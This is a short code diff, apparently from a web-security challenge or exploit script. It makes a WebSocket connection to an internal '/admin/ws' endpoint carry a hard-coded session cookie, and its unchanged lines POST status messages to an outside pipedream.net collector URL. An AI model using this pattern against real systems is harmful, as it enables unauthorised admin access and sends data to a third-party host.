@@ -10,7 +10,16 @@
             body: JSON.stringify({ message: "Bot accessed HTML page" })
         });
 
-        const ws = new WebSocket('ws://library-web:8080/admin/ws');
+
+        const ws = new WebSocket(
+            'ws://web:8080/admin/ws',
+            [],
+            {
+                'headers': {
+                    'Cookie': cookie.serialize('id', '496E66DD')
+                }
+            }
+        );
 
         fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
             method: 'POST',
